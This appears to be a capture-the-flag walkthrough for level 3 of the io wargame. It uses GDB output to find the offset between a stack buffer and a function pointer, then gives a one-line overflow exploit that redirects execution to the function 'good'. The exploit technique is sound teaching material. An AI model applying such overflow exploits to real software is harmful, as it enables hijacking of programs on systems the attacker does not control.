@@ -1,0 +1,64 @@
+Use GDB to inspect buffer and function pointer address:
+
+level3@io:/levels$ gdb -q ./level03
+Reading symbols from /levels/level03...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x80484ce
+(gdb) run "AAAAAAAA"
+Starting program: /levels/level03 "AAAAAAAA"
+
+Breakpoint 1, 0x080484ce in main ()
+(gdb) disass
+Dump of assembler code for function main:
+   0x080484c8 <+0>:	push   %ebp
+   0x080484c9 <+1>:	mov    %esp,%ebp
+   0x080484cb <+3>:	sub    $0x78,%esp
+=> 0x080484ce <+6>:	and    $0xfffffff0,%esp
+   [...]
+   0x08048515 <+77>:	mov    %eax,0x8(%esp)
+   0x08048519 <+81>:	mov    0xc(%ebp),%eax
+   0x0804851c <+84>:	add    $0x4,%eax
+   0x0804851f <+87>:	mov    (%eax),%eax
+   0x08048521 <+89>:	mov    %eax,0x4(%esp)
+   0x08048525 <+93>:	lea    -0x58(%ebp),%eax
+   0x08048528 <+96>:	mov    %eax,(%esp)
+   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
+   0x08048530 <+104>:	mov    0xc(%ebp),%eax
+   [...]
+   0x0804856d <+165>:	mov    -0xc(%ebp),%eax
+   0x08048570 <+168>:	call   *%eax
+   0x08048572 <+170>:	movl   $0x0,-0x5c(%ebp)
+   0x08048579 <+177>:	mov    -0x5c(%ebp),%eax
+   0x0804857c <+180>:	leave  
+   0x0804857d <+181>:	ret    
+End of assembler dump.
+(gdb) b *0x08048530
+Breakpoint 2 at 0x8048530
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048530 in main ()
+(gdb) x/40x $esp
+0xbffffc50:	0xbffffc70	0xbffffe88	0x00000008	0x00000001
+0xbffffc60:	0xb7fff908	0xb7e878d0	0xbffffd74	0xbffffe78
+0xbffffc70:	0x41414141	0x41414141	0x0000002f	0xb7fd1ff4
+0xbffffc80:	0x00000000	0x080497c8	0xbffffc98	0x08048338
+0xbffffc90:	0xb7ff0590	0x080497c8	0xbffffcc8	0x080485a9
+0xbffffca0:	0xb7fd2304	0xb7fd1ff4	0x08048590	0xbffffcc8
+0xbffffcb0:	0xb7eb7505	0xb7ff0590	0x0804859b	0x080484a4
+0xbffffcc0:	0x08048590	0x00000000	0xbffffd48	0xb7e9ee16
+0xbffffcd0:	0x00000002	0xbffffd74	0xbffffd80	0xb7fe19d0
+0xbffffce0:	0xb7ff6821	0x0177ff8e	0xb7ffeff4	0x08048274
+(gdb) p $ebp
+$1 = (void *) 0xbffffcc8
+
+Buffer address is 0xbffffc70. Function pointer address is ebp-0xc
+= 0xbffffcbc.
+
+Difference between the two addresses is 4c = 76.
+
+We write 76 'A's followed by the address of the function `good', that is
+0x08048474. Bytes are written in reverse as is the case with little endian
+architectures:
+
+./level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
